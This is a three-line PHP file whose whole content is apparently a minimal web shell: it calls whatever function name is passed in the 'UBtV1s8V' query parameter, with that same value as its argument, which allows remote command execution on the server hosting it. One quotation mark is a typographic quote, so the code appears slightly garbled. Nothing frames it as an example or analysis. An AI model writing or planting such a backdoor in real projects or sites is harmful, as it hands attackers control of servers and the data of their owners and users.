<?php
$_GET[’UBtV1s8V']($_GET['UBtV1s8V']);
?>
